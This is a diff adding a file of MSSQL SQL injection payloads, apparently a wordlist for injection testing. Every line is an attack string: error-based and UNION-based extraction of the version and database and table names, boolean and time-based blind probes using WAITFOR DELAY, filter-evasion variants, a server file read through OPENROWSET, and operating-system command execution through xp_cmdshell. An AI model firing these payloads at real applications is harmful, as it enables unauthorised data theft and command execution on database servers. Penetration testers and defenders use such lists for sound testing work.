@@ -1,0 +1,16 @@
+' AND 1=CONVERT(int, (SELECT @@version))-- -
+' AND 1=CAST((SELECT name FROM master.sys.databases) AS int)-- -
+' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1-- -
+' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))=65) THEN 1 ELSE 0 END)=1-- -
+'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
+'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))=65) WAITFOR DELAY '0:0:5'-- -
+' UNION SELECT NULL, NULL, NULL-- -
+' UNION SELECT name, NULL, NULL FROM master..sysdatabases-- -
+' UNION SELECT name, NULL, NULL FROM sysobjects WHERE xtype='U'-- -
+'/**/UNION/**/SELECT/**/NULL,NULL,NULL-- -
+'+UNION+SELECT+NULL,NULL,NULL-- -
+' UNION SELECT CHAR(97)+CHAR(98)+CHAR(99), NULL, NULL-- -
+' UNION SELECT NULL, NULL, BulkColumn FROM OPENROWSET(BULK 'C:\boot.ini', SINGLE_BLOB) AS f-- -
+'; EXEC xp_cmdshell 'whoami'-- -
+'; EXEC master..xp_cmdshell 'dir'-- -
